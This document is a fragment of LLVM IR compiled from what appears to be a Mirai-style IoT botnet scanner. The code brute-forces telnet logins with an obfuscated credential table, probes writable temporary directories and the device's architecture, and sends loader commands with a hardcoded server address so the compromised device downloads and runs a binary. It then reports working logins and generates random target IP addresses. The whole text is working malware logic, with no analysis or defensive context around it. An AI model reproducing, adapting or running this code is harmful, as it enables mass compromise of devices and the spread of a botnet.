  %282 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 8, i64 0
  %283 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 1, i32 1
  %284 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 1, i32 1
  %285 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 8, i64 0
  %286 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 8, i64 0
  %287 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 12
  %288 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 15
  %289 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 1, i32 1
  br label %292

.thread263.loopexitthread-pre-split:              ; preds = %467, %541
  %.pr309 = load i32, i32* %265, align 8
  br label %.thread263.loopexit

.thread263.loopexit.loopexit:                     ; preds = %320
  br label %.thread263.loopexit

.thread263.loopexit:                              ; preds = %.thread263.loopexit.loopexit, %.thread263.loopexitthread-pre-split
  %290 = phi i32 [ %.pr309, %.thread263.loopexitthread-pre-split ], [ %321, %.thread263.loopexit.loopexit ]
  %291 = icmp eq i32 %290, 0
  br i1 %291, label %.loopexit.loopexit, label %292

; <label>:292:                                    ; preds = %.lr.ph289, %.thread263.loopexit
  %293 = load i32, i32* %268, align 8
  %294 = icmp sgt i32 %293, 7168
  br i1 %294, label %295, label %298

; <label>:295:                                    ; preds = %292
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %269, i8* nonnull %270, i64 2048, i32 1, i1 false)
  %296 = load i32, i32* %268, align 8
  %297 = add nsw i32 %296, -6144
  store i32 %297, i32* %268, align 8
  br label %298

; <label>:298:                                    ; preds = %295, %292
  store i32 0, i32* %97, align 4
  %299 = load i32, i32* %221, align 8
  %300 = load i32, i32* %268, align 8
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 7, i64 %301
  %303 = sub nsw i32 8192, %300
  %304 = call i32 @recv_strip_null(i32 %299, i8* %302, i32 %303, i32 16384)
  switch i32 %304, label %316 [
    i32 0, label %.thread265
    i32 -1, label %305
  ]

.thread265:                                       ; preds = %298
  store i32 104, i32* %97, align 4
  br label %307

; <label>:305:                                    ; preds = %298
  %.pr264 = load i32, i32* %97, align 4
  %306 = icmp eq i32 %.pr264, 11
  br i1 %306, label %.loopexit, label %307

; <label>:307:                                    ; preds = %.thread265, %305
  %308 = load i32, i32* %221, align 8
  %309 = call i32 @close(i32 %308) #9
  store i32 -1, i32* %221, align 8
  %310 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 9
  %311 = load i8, i8* %310, align 4
  %312 = add i8 %311, 1
  store i8 %312, i8* %310, align 4
  %313 = icmp ugt i8 %312, 9
  br i1 %313, label %314, label %315

; <label>:314:                                    ; preds = %307
  call void @fdclose(%struct.scanner_connection* nonnull %220, i32 undef)
  br label %.loopexit

; <label>:315:                                    ; preds = %307
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %220)
  br label %.loopexit

; <label>:316:                                    ; preds = %298
  %317 = load i32, i32* %268, align 8
  %318 = add nsw i32 %317, %304
  store i32 %318, i32* %268, align 8
  %319 = load i32, i32* @fake_time, align 4
  store i32 %319, i32* %272, align 4
  br label %320

; <label>:320:                                    ; preds = %.thread259, %316
  %321 = load i32, i32* %265, align 8
  switch i32 %321, label %.thread263.loopexit.loopexit [
    i32 2, label %322
    i32 3, label %326
    i32 4, label %335
    i32 5, label %344
    i32 6, label %363
    i32 7, label %387
    i32 8, label %394
    i32 9, label %401
    i32 10, label %455
    i32 12, label %467
    i32 11, label %487
    i32 13, label %523
  ]

; <label>:322:                                    ; preds = %320
  %323 = call fastcc i32 @consume_iacs(%struct.scanner_connection* nonnull %220)
  %324 = icmp sgt i32 %323, 0
  br i1 %324, label %325, label %541

; <label>:325:                                    ; preds = %322
  store i32 3, i32* %265, align 8
  br label %.thread259

; <label>:326:                                    ; preds = %320
  %327 = call fastcc i32 @consume_login_prompt(%struct.scanner_connection* nonnull %220, i32 1)
  %328 = icmp sgt i32 %327, 0
  br i1 %328, label %329, label %541

; <label>:329:                                    ; preds = %326
  %330 = load i32, i32* %221, align 8
  %331 = load %struct.scanner_auth*, %struct.scanner_auth** %273, align 8
  %332 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %331, i64 0, i32 0
  %333 = load i8*, i8** %332, align 8
  %334 = call i32 (i32, i8*, ...) @fdsend(i32 %330, i8* %333)
  store i32 4, i32* %265, align 8
  br label %.thread259

; <label>:335:                                    ; preds = %320
  %336 = call fastcc i32 @consume_login_prompt(%struct.scanner_connection* nonnull %220, i32 0)
  %337 = icmp sgt i32 %336, 0
  br i1 %337, label %338, label %541

; <label>:338:                                    ; preds = %335
  %339 = load i32, i32* %221, align 8
  %340 = load %struct.scanner_auth*, %struct.scanner_auth** %274, align 8
  %341 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %340, i64 0, i32 1
  %342 = load i8*, i8** %341, align 8
  %343 = call i32 (i32, i8*, ...) @fdsend(i32 %339, i8* %342)
  store i32 5, i32* %265, align 8
  br label %.thread259

; <label>:344:                                    ; preds = %320
  %345 = call fastcc i32 @consume_shell_prompt(%struct.scanner_connection* nonnull %220)
  %346 = icmp sgt i32 %345, 0
  br i1 %346, label %347, label %353

; <label>:347:                                    ; preds = %344
  call void @table_unlock_val(i8 zeroext 11) #9
  %348 = load i32, i32* %221, align 8
  %349 = call i32 (i32, i8*, ...) @fdsend(i32 %348, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.105, i64 0, i64 0))
  %350 = load i32, i32* %221, align 8
  %351 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %352 = call i32 (i32, i8*, ...) @fdsend(i32 %350, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i64 0, i64 0), i8* %351)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 6, i32* %265, align 8
  br label %.thread259

; <label>:353:                                    ; preds = %344
  %354 = icmp eq i32 %345, -1
  br i1 %354, label %355, label %541

; <label>:355:                                    ; preds = %353
  %356 = load i32, i32* %221, align 8
  %357 = call i32 @close(i32 %356) #9
  store i32 -1, i32* %221, align 8
  %358 = load i8, i8* %275, align 4
  %359 = add i8 %358, 1
  store i8 %359, i8* %275, align 4
  %360 = icmp eq i8 %359, 10
  br i1 %360, label %361, label %362

; <label>:361:                                    ; preds = %355
  call void @fdclose(%struct.scanner_connection* nonnull %220, i32 undef)
  br label %.thread259

; <label>:362:                                    ; preds = %355
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %220)
  br label %.thread259

; <label>:363:                                    ; preds = %320
  %364 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %220)
  %365 = icmp sgt i32 %364, 0
  br i1 %365, label %366, label %541

; <label>:366:                                    ; preds = %363
  store i32 0, i32* %276, align 4
  %367 = load i32, i32* %277, align 8
  %368 = icmp eq i32 %367, 0
  br i1 %368, label %369, label %372

; <label>:369:                                    ; preds = %366
  %370 = load i32, i32* %221, align 8
  %371 = call i32 (i32, i8*, ...) @fdsend(i32 %370, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.107, i64 0, i64 0))
  br label %386

; <label>:372:                                    ; preds = %366
  %373 = call i32 @strcmp(i8* nonnull %278, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0)) #12
  %374 = icmp eq i32 %373, 0
  br i1 %374, label %378, label %375

; <label>:375:                                    ; preds = %372
  %376 = call i32 @strcmp(i8* %278, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i64 0, i64 0)) #12
  %377 = icmp eq i32 %376, 0
  br i1 %377, label %378, label %382

; <label>:378:                                    ; preds = %375, %372
  call void @table_unlock_val(i8 zeroext 11) #9
  %379 = load i32, i32* %221, align 8
  %380 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %381 = call i32 (i32, i8*, ...) @fdsend(i32 %379, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.110, i64 0, i64 0), i8* %380)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 8, i32* %265, align 8
  br label %.thread259

; <label>:382:                                    ; preds = %375
  call void @table_unlock_val(i8 zeroext 11) #9
  %383 = load i32, i32* %221, align 8
  %384 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %385 = call i32 (i32, i8*, ...) @fdsend(i32 %383, i8* %384)
  call void @table_lock_val(i8 zeroext 11) #9
  br label %386

; <label>:386:                                    ; preds = %382, %369
  %.sink = phi i32 [ 9, %382 ], [ 7, %369 ]
  store i32 %.sink, i32* %265, align 8
  br label %.thread259

; <label>:387:                                    ; preds = %320
  %388 = call fastcc i32 @parse_elf_response(%struct.scanner_connection* nonnull %220)
  %389 = icmp sgt i32 %388, 0
  br i1 %389, label %390, label %391

; <label>:390:                                    ; preds = %387
  store i32 1, i32* %279, align 8
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %220)
  br label %.thread259

; <label>:391:                                    ; preds = %387
  %392 = icmp eq i32 %388, -1
  br i1 %392, label %393, label %541

; <label>:393:                                    ; preds = %391
  store i8 0, i8* %280, align 4
  call void @fdclose(%struct.scanner_connection* %220, i32 undef)
  br label %.thread259

; <label>:394:                                    ; preds = %320
  %395 = call fastcc i32 @consume_arm_subtype(%struct.scanner_connection* nonnull %220)
  %396 = icmp sgt i32 %395, 0
  br i1 %396, label %397, label %541

; <label>:397:                                    ; preds = %394
  call void @table_unlock_val(i8 zeroext 11) #9
  %398 = load i32, i32* %221, align 8
  %399 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %400 = call i32 (i32, i8*, ...) @fdsend(i32 %398, i8* %399)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 9, i32* %265, align 8
  br label %.thread259

; <label>:401:                                    ; preds = %320
  %402 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %220)
  %403 = icmp sgt i32 %402, 0
  br i1 %403, label %.thread310, label %541

.thread310:                                       ; preds = %401
  %404 = load i32, i32* %281, align 4
  call fastcc void @report_working(i32 %404, %struct.scanner_connection* %220, i32 0)
  %405 = load i32, i32* %221, align 8
  %406 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 0), align 16
  %407 = call i32 (i32, i8*, ...) @fdsend(i32 %405, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %406, i8* %406)
  %408 = load i32, i32* %221, align 8
  %409 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 1), align 8
  %410 = call i32 (i32, i8*, ...) @fdsend(i32 %408, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %409, i8* %409)
  %411 = load i32, i32* %221, align 8
  %412 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 2), align 16
  %413 = call i32 (i32, i8*, ...) @fdsend(i32 %411, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %412, i8* %412)
  %414 = load i32, i32* %221, align 8
  %415 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 3), align 8
  %416 = call i32 (i32, i8*, ...) @fdsend(i32 %414, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %415, i8* %415)
  %417 = load i32, i32* %221, align 8
  %418 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 4), align 16
  %419 = call i32 (i32, i8*, ...) @fdsend(i32 %417, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %418, i8* %418)
  %420 = load i32, i32* %221, align 8
  %421 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 5), align 8
  %422 = call i32 (i32, i8*, ...) @fdsend(i32 %420, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %421, i8* %421)
  %423 = load i32, i32* %221, align 8
  %424 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 6), align 16
  %425 = call i32 (i32, i8*, ...) @fdsend(i32 %423, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %424, i8* %424)
  %426 = load i32, i32* %221, align 8
  %427 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 7), align 8
  %428 = call i32 (i32, i8*, ...) @fdsend(i32 %426, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %427, i8* %427)
  %429 = load i32, i32* %221, align 8
  %430 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 8), align 16
  %431 = call i32 (i32, i8*, ...) @fdsend(i32 %429, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %430, i8* %430)
  %432 = load i32, i32* %221, align 8
  %433 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 9), align 8
  %434 = call i32 (i32, i8*, ...) @fdsend(i32 %432, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %433, i8* %433)
  %435 = load i32, i32* %221, align 8
  %436 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 10), align 16
  %437 = call i32 (i32, i8*, ...) @fdsend(i32 %435, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %436, i8* %436)
  %438 = load i32, i32* %221, align 8
  %439 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 11), align 8
  %440 = call i32 (i32, i8*, ...) @fdsend(i32 %438, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %439, i8* %439)
  %441 = load i32, i32* %221, align 8
  %442 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 12), align 16
  %443 = call i32 (i32, i8*, ...) @fdsend(i32 %441, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %442, i8* %442)
  %444 = load i32, i32* %221, align 8
  %445 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 13), align 8
  %446 = call i32 (i32, i8*, ...) @fdsend(i32 %444, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %445, i8* %445)
  %447 = load i32, i32* %221, align 8
  %448 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 14), align 16
  %449 = call i32 (i32, i8*, ...) @fdsend(i32 %447, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %448, i8* %448)
  %450 = load i32, i32* %221, align 8
  %451 = call i32 (i32, i8*, ...) @fdsend(i32 %450, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.112, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.114, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 11) #9
  %452 = load i32, i32* %221, align 8
  %453 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %454 = call i32 (i32, i8*, ...) @fdsend(i32 %452, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.115, i64 0, i64 0), i8* %453)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 10, i32* %265, align 8
  br label %.thread259

; <label>:455:                                    ; preds = %320
  %456 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %220)
  %457 = icmp sgt i32 %456, 0
  br i1 %457, label %458, label %541

; <label>:458:                                    ; preds = %455
  %459 = call i32 @strcmp(i8* nonnull %282, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0)) #12
  %460 = icmp eq i32 %459, 0
  call void @table_unlock_val(i8 zeroext 11) #9
  %461 = load i32, i32* %221, align 8
  %462 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  br i1 %460, label %463, label %465

; <label>:463:                                    ; preds = %458
  %464 = call i32 (i32, i8*, ...) @fdsend(i32 %461, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.117, i64 0, i64 0), i32 176, i32 107, i32 133, i32 208, i32 176, i32 107, i32 133, i32 208, i8* %462)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 3, i32* %283, align 4
  store i32 13, i32* %265, align 8
  br label %.thread259

; <label>:465:                                    ; preds = %458
  %466 = call i32 (i32, i8*, ...) @fdsend(i32 %461, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.118, i64 0, i64 0), i8* %462)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 12, i32* %265, align 8
  br label %.thread259

; <label>:467:                                    ; preds = %320
  %468 = call fastcc i32 @connection_consume_upload_methods(%struct.scanner_connection* nonnull %220)
  %469 = icmp eq i32 %468, 0
  br i1 %469, label %.thread263.loopexitthread-pre-split, label %470

; <label>:470:                                    ; preds = %467
  call void @table_unlock_val(i8 zeroext 11) #9
  %471 = load i32, i32* %284, align 4
  switch i32 %471, label %484 [
    i32 0, label %472
    i32 1, label %476
    i32 2, label %480
  ]

; <label>:472:                                    ; preds = %470
  %473 = load i32, i32* %221, align 8
  %474 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %475 = call i32 (i32, i8*, ...) @fdsend(i32 %473, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.119, i64 0, i64 0), i8* %474)
  br label %484

; <label>:476:                                    ; preds = %470
  %477 = load i32, i32* %221, align 8
  %478 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %479 = call i32 (i32, i8*, ...) @fdsend(i32 %477, i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.120, i64 0, i64 0), i32 176, i32 107, i32 133, i32 208, i8* nonnull %285, i8* %478)
  br label %484

; <label>:480:                                    ; preds = %470
  %481 = load i32, i32* %221, align 8
  %482 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %483 = call i32 (i32, i8*, ...) @fdsend(i32 %481, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.121, i64 0, i64 0), i8* nonnull %286, i32 176, i32 107, i32 133, i32 208, i8* %482)
  br label %484

; <label>:484:                                    ; preds = %480, %476, %472, %470
  call void @table_lock_val(i8 zeroext 11) #9
  %485 = load i32, i32* %284, align 4
  %486 = icmp ne i32 %485, 0
  %.sink4 = select i1 %486, i32 13, i32 11
  store i32 %.sink4, i32* %265, align 8
  br label %.thread259

; <label>:487:                                    ; preds = %320
  %488 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %220)
  %489 = icmp sgt i32 %488, 0
  br i1 %489, label %490, label %541

; <label>:490:                                    ; preds = %487
  %491 = call fastcc %struct.payload* @get_retrieve_binary(%struct.scanner_connection* %220)
  %492 = icmp eq %struct.payload* %491, null
  br i1 %492, label %493, label %494

; <label>:493:                                    ; preds = %490
  call void @fdclose(%struct.scanner_connection* %220, i32 undef)
  br label %.thread259

; <label>:494:                                    ; preds = %490
  %495 = call fastcc %struct.binary* @process_retrieve_binary(%struct.payload* nonnull %491)
  %496 = icmp eq %struct.binary* %495, null
  br i1 %496, label %497, label %498

; <label>:497:                                    ; preds = %494
  call void @fdclose(%struct.scanner_connection* %220, i32 undef)
  br label %.thread259

; <label>:498:                                    ; preds = %494
  call void @table_unlock_val(i8 zeroext 11) #9
  %499 = load i32, i32* %221, align 8
  %500 = load i8, i8* %287, align 1
  %501 = zext i8 %500 to i64
  %502 = getelementptr inbounds %struct.binary, %struct.binary* %495, i64 %501, i32 0
  %503 = load i8*, i8** %502, align 8
  %504 = zext i8 %500 to i32
  %505 = icmp eq i8 %500, 0
  %506 = select i1 %505, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i64 0, i64 0)
  %507 = getelementptr inbounds %struct.binary, %struct.binary* %495, i64 0, i32 1
  %508 = load i8, i8* %507, align 8
  %509 = zext i8 %508 to i32
  %510 = add nsw i32 %509, -1
  %511 = icmp sge i32 %504, %510
  %512 = select i1 %511, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.125, i64 0, i64 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.126, i64 0, i64 0)
  %513 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %514 = call i32 (i32, i8*, ...) @fdsend(i32 %499, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.122, i64 0, i64 0), i8* %503, i8* %506, i8* %512, i8* %513)
  call void @table_lock_val(i8 zeroext 11) #9
  %515 = load i8, i8* %287, align 1
  %516 = load i8, i8* %507, align 8
  %517 = icmp ult i8 %515, %516
  %518 = bitcast %struct.binary* %495 to i8*
  call void @free(i8* %518) #9
  br i1 %517, label %519, label %522

; <label>:519:                                    ; preds = %498
  %520 = load i8, i8* %287, align 1
  %521 = add i8 %520, 1
  store i8 %521, i8* %287, align 1
  store i32 11, i32* %265, align 8
  br label %.thread259

; <label>:522:                                    ; preds = %498
  store i32 13, i32* %265, align 8
  br label %.thread259

; <label>:523:                                    ; preds = %320
  %524 = call fastcc i32 @consume_method_resonse(%struct.scanner_connection* nonnull %220)
  %525 = icmp sgt i32 %524, 0
  br i1 %525, label %526, label %528

; <label>:526:                                    ; preds = %523
  %527 = load i32, i32* %288, align 4
  call fastcc void @report_working(i32 %527, %struct.scanner_connection* %220, i32 1)
  call void @fdclose(%struct.scanner_connection* %220, i32 undef)
  br label %.thread259

; <label>:528:                                    ; preds = %523
  switch i32 %524, label %541 [
    i32 -1, label %529
    i32 -2, label %540
  ]

; <label>:529:                                    ; preds = %528
  %530 = load i32, i32* %265, align 8
  %531 = icmp eq i32 %530, 11
  br i1 %531, label %535, label %532

; <label>:532:                                    ; preds = %529
  %533 = load i32, i32* %289, align 4
  %534 = icmp eq i32 %533, 0
  br i1 %534, label %535, label %536

; <label>:535:                                    ; preds = %532, %529
  call void @fdclose(%struct.scanner_connection* nonnull %220, i32 undef)
  br label %.thread259

; <label>:536:                                    ; preds = %532
  store i32 0, i32* %289, align 4
  store i32 11, i32* %265, align 8
  call void @table_unlock_val(i8 zeroext 11) #9
  %537 = load i32, i32* %221, align 8
  %538 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %539 = call i32 (i32, i8*, ...) @fdsend(i32 %537, i8* %538)
  call void @table_lock_val(i8 zeroext 11) #9
  br label %.thread259

; <label>:540:                                    ; preds = %528
  call void @fdclose(%struct.scanner_connection* %220, i32 undef)
  br label %.thread259

; <label>:541:                                    ; preds = %528, %487, %455, %401, %394, %391, %363, %353, %335, %326, %322
  %.0236 = phi i32 [ %488, %487 ], [ %456, %455 ], [ %402, %401 ], [ %395, %394 ], [ %388, %391 ], [ %364, %363 ], [ %345, %353 ], [ %336, %335 ], [ %327, %326 ], [ %323, %322 ], [ %524, %528 ]
  %542 = icmp eq i32 %.0236, 0
  br i1 %542, label %.thread263.loopexitthread-pre-split, label %.thread259

.thread259:                                       ; preds = %.thread310, %325, %329, %338, %362, %361, %347, %378, %386, %393, %390, %397, %465, %463, %484, %493, %497, %522, %519, %540, %536, %535, %526, %541
  %.0236260 = phi i32 [ %.0236, %541 ], [ %323, %325 ], [ %327, %329 ], [ %336, %338 ], [ -1, %362 ], [ -1, %361 ], [ %345, %347 ], [ %364, %378 ], [ %364, %386 ], [ -1, %393 ], [ %388, %390 ], [ %395, %397 ], [ %456, %465 ], [ %456, %463 ], [ %468, %484 ], [ %488, %493 ], [ %488, %497 ], [ %488, %522 ], [ %488, %519 ], [ -2, %540 ], [ -1, %536 ], [ -1, %535 ], [ %524, %526 ], [ %402, %.thread310 ]
  %543 = load i32, i32* %268, align 8
  %544 = icmp sgt i32 %.0236260, %543
  %..0236 = select i1 %544, i32 %543, i32 %.0236260
  %545 = sub nsw i32 %543, %..0236
  store i32 %545, i32* %268, align 8
  %546 = sext i32 %..0236 to i64
  %547 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 7, i64 %546
  %548 = sext i32 %545 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %271, i8* %547, i64 %548, i32 1, i1 false)
  %549 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 7, i64 %548
  store i8 0, i8* %549, align 1
  br label %320

.loopexit.loopexit:                               ; preds = %.thread263.loopexit
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.thread263.preheader, %305, %254, %315, %314, %218, %239
  %550 = load i32, i32* %1, align 4
  %551 = add nsw i32 %550, 1
  store i32 %551, i32* %1, align 4
  %552 = icmp slt i32 %551, 628
  br i1 %552, label %218, label %.loopexit266.loopexit
}

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_auth_entry(i8*, i8*, i16 zeroext) unnamed_addr #3 {
  %4 = alloca i32, align 4
  %5 = load i8*, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %6 = load i32, i32* @auth_table_len, align 4
  %7 = add nsw i32 %6, 1
  %8 = sext i32 %7 to i64
  %9 = mul nsw i64 %8, 24
  %10 = tail call i8* @realloc(i8* %5, i64 %9) #9
  store i8* %10, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %11 = call fastcc i8* @deobf(i8* %0, i32* nonnull %4)
  %12 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %13 = load i32, i32* @auth_table_len, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %12, i64 %14, i32 0
  store i8* %11, i8** %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20, i32 4
  store i8 %17, i8* %21, align 4
  %22 = call fastcc i8* @deobf(i8* %1, i32* nonnull %4)
  %23 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %24 = load i32, i32* @auth_table_len, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %23, i64 %25, i32 1
  store i8* %22, i8** %26, align 8
  %27 = load i32, i32* %4, align 4
  %28 = trunc i32 %27 to i8
  %29 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %30 = load i32, i32* @auth_table_len, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %29, i64 %31, i32 5
  store i8 %28, i8* %32, align 1
  %33 = load i16, i16* @auth_table_max_weight, align 2
  %34 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %29, i64 %31, i32 2
  store i16 %33, i16* %34, align 8
  %35 = add i16 %33, %2
  %36 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %37 = load i32, i32* @auth_table_len, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* @auth_table_len, align 4
  %39 = sext i32 %37 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %36, i64 %39, i32 3
  store i16 %35, i16* %40, align 2
  %41 = load i16, i16* @auth_table_max_weight, align 2
  %42 = add i16 %41, %2
  store i16 %42, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_random_ip() unnamed_addr #3 {
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %1 = tail call i32 @rand_next() #9
  %2 = urem i32 %1, 255
  %3 = tail call i32 @rand_next() #9
  %4 = tail call i32 @rand_next() #9
  %5 = tail call i32 @rand_next() #9
  %trunc = trunc i32 %2 to i8
  switch i8 %trunc, label %6 [
    i8 0, label %.critedge.backedge
    i8 127, label %.critedge.backedge
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge
  br label %.critedge

; <label>:6:                                      ; preds = %.critedge
  %7 = urem i32 %3, 255
  %8 = urem i32 %4, 255
  %9 = urem i32 %5, 255
  %10 = tail call i32 @rand_next() #9
  %11 = urem i32 %10, 35
  %trunc50 = trunc i32 %11 to i6
  switch i6 %trunc50, label %38 [
    i6 0, label %12
    i6 1, label %17
    i6 2, label %20
    i6 3, label %23
    i6 4, label %28
    i6 5, label %33
  ]

; <label>:12:                                     ; preds = %6
  %13 = shl nuw nsw i32 %7, 16
  %14 = shl nuw nsw i32 %8, 8
  %15 = or i32 %14, %13
  %16 = or i32 %15, %9
